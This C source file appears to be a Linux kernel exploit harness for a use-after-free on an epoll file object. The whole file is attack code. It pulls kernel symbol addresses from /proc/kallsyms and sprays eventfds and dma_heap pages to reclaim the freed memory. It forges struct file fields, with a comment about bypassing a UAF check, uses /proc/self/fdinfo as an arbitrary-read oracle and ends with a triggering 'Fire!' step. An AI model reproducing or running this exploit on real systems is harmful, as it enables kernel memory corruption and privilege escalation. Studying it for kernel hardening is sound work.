#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/ioctl.h>
#include <errno.h>

#define DMA_HEAP_IOCTL_ALLOC 0xc0184800

struct dma_heap_allocation_data {
    uint64_t len;
    uint32_t fd;
    uint32_t fd_flags;
    uint64_t heap_flags;
};

long read_filp_slabs_count(void) {
    int fd = open("/sys/kernel/slab/filp/slabs", O_RDONLY);
    if (fd < 0) return -1;
    char buf[64] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    return strtol(buf, NULL, 10);
}

uint64_t aar_read(int fd) {
    char buf[256];
    int n = read(fd, buf, sizeof(buf)-1);
    if (n <= 0) return 0;
    buf[n] = 0;
    char *p = strstr(buf, "ino:\t");
    if (p) {
        return strtoull(p + 5, NULL, 16);
    }
    return 0;
}

uint64_t get_kallsyms_address(const char *name) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char line[256];
    uint64_t addr = 0;
    while (fgets(line, sizeof(line), f)) {
        char sym_type;
        char sym_name[128];
        uint64_t sym_addr;
        if (sscanf(line, "%llx %c %s", &sym_addr, &sym_type, sym_name) == 3) {
            if (strcmp(sym_name, name) == 0) {
                addr = sym_addr;
                break;
            }
        }
    }
    fclose(f);
    return addr;
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);

    struct rlimit rl;
    rl.rlim_cur = 200000;
    rl.rlim_max = 200000;
    setrlimit(RLIMIT_NOFILE, &rl);

    printf("[*] Init: Starting harness on /dev/console...\\n");

    uint64_t init_task = get_kallsyms_address("init_task");
    uint64_t comm_addr = init_task + 0x798;
    uint64_t swaps_proc_ops = get_kallsyms_address("swaps_proc_ops");
    uint64_t empty_zero_page = get_kallsyms_address("empty_zero_page");
    uint64_t ep_dbg_uaf_detected = get_kallsyms_address("ep_dbg_uaf_detected");

    printf("[*] init_task = %llx, comm_addr = %llx\\n", init_task, comm_addr);
    printf("[*] swaps_proc_ops = %llx\\n", swaps_proc_ops);
    printf("[*] ep_dbg_uaf_detected = %llx\\n", ep_dbg_uaf_detected);

    int dma_heap_fd = open("/dev/dma_heap/system", O_RDWR);
    if (dma_heap_fd < 0) {
        printf("[-] Failed to open dma_heap\\n");
        return 1;
    }

    static int bg_fds[4000];
    for (int i = 0; i < 4000; i++) bg_fds[i] = eventfd(0, 0);

    int epA = epoll_create1(0);
    static int batch_a[1000], batch_b[1000];
    for (int i = 0; i < 1000; i++) batch_a[i] = eventfd(0, 0);
    int inner = eventfd(0, EFD_NONBLOCK);
    for (int i = 0; i < 1000; i++) batch_b[i] = eventfd(0, 0);

    struct epoll_event ev;
    ev.events = EPOLLIN;
    ev.data.fd = inner;
    epoll_ctl(epA, EPOLL_CTL_ADD, inner, &ev);

    printf("[*] Calling getpid() to arm GDB hook...\\n");
    fflush(stdout);
    getpid();

    close(inner);
    sleep(1);

    long peak_slabs = read_filp_slabs_count();
    printf("[*] Peak filp slabs = %ld\\n", peak_slabs);

    for (int i = 0; i < 1000; i++) close(batch_a[i]);
    for (int i = 0; i < 1000; i++) close(batch_b[i]);
    for (int i = 0; i < 4000; i++) close(bg_fds[i]);

    sleep(2);

    long post_drain_slabs = read_filp_slabs_count();
    printf("[*] Post-drain filp slabs = %ld (delta = %ld)\\n", post_drain_slabs, peak_slabs - post_drain_slabs);

    char payload[4096];
    memset(payload, 0, sizeof(payload));
    for (int off = 0; off < 4096; off += 256) {
        uint64_t base = (uint64_t)(payload + off);
        *(uint64_t *)(base + 32) = comm_addr - 0x40; // f_inode
        *(uint64_t *)(base + 40) = swaps_proc_ops - 0x10; // f_op -> swaps_poll
        *(uint32_t *)(base + 48) = 0;    // f_lock
        *(uint64_t *)(base + 184) = 0;   // f_version (bypass debugfs UAF check!)
        *(uint64_t *)(base + 200) = ep_dbg_uaf_detected - 0x60; // private_data
        *(uint64_t *)(base + 208) = empty_zero_page; // f_ep (cleanup safe)
    }

    char path[256];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epA);
    int fdinfo_fd = open(path, O_RDONLY);
    if (fdinfo_fd < 0) {
        printf("[-] Failed to open fdinfo\\n");
        return 1;
    }

    int hit = 0;
    static int spray_fds[40960];
    static void *spray_maps[40960];

    int rounds = 5;
    int pages_per = 8192;

    for (int r = 0; r < rounds; r++) {
        for (int i = 0; i < pages_per; i++) {
            int idx = r * pages_per + i;
            struct dma_heap_allocation_data alloc = { .len = 4096, .fd_flags = O_RDWR | O_CLOEXEC, .heap_flags = 0 };
            int ret = ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &alloc);
            if (ret < 0) continue;
            spray_fds[idx] = alloc.fd;
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, alloc.fd, 0);
            if (p == MAP_FAILED) continue;
            spray_maps[idx] = p;
            memcpy(p, payload, 4096);
        }

        lseek(fdinfo_fd, 0, SEEK_SET);
        uint64_t f_ino = aar_read(fdinfo_fd);
        
        if (f_ino != 0 && f_ino != 3 && f_ino != 0x0072657070617773) {
            printf("[!] f_ino changed to %llx in round %d!\\n", (unsigned long long)f_ino, r);
        }

        if (f_ino == 0x0072657070617773) { // "swapper\0"
            printf("[+] Oracle Hit! 'swapper' found in round %d!\\n", r);
            hit = 1;
            break;
        }
    }

    if (hit) {
        printf("[*] Fire!\\n");
        epoll_wait(epA, &ev, 1, 0);
        printf("[+] Fire complete.\\n");
        close(epA);
    } else {
        printf("[-] Miss. Leaking epA.\\n");
        // intentionally leak epA to avoid panic
    }

    return 0;
}
